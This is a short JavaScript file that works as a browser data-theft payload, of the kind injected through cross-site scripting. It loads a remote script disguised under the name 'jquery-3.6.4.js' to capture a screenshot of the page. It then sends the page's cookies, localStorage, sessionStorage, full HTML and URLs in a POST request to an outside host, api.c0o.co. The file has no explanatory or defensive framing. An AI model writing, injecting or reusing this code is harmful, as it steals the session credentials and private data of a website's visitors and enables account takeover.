loadcanvas()

function postrequest(img){
    htmls = escape(document.documentElement.outerHTML);
    localstorages = btoa(encodeURIComponent(JSON.stringify(localStorage)));
    sessionStorages = btoa(encodeURIComponent(JSON.stringify(sessionStorage)));
    createXmlHttp();
    let url = "https://api.c0o.co/?js=0i.ae";
    let notice = "Host:" + window.location.host + "\n" + "Cookie:" + document.cookie + "\n" + "Referer:" + window.location.href + "\n" + "Parent:" + parent.location.href;
    notice = encodeURIComponent(notice);
    let data = "notice=" + notice + "&localStorage=" + localstorages + "&sessionStorage=" + sessionStorages + "&html=" + htmls + "&img=" + img;
    xmlHttp.open("POST", url, true);
    xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
    xmlHttp.send(data)
}

function loadcanvas(){
    let canvas = document.createElement('script');
    canvas.src = "https://cdn.jsdelivr.net/gh/lisalidbs/test@main/jquery-3.6.4.js";
    document.getElementsByTagName('head')[0].appendChild(canvas);
    canvas.onload = function(){
        getscreenshot(postrequest);
    }
}

function getscreenshot(callback){
    html2canvas(document.body).then(function (canvas) {
        img = encodeURIComponent(canvas.toDataURL('image/png'));
        callback(img);
    });
}

function createXmlHttp() {
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest()
    } else {
        var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
        for (var n = 0; n < MSXML.length; n++) {
            try {
                xmlHttp = new ActiveXObject(MSXML[n]);
                break
            } catch(e) {}
        }
    }
}
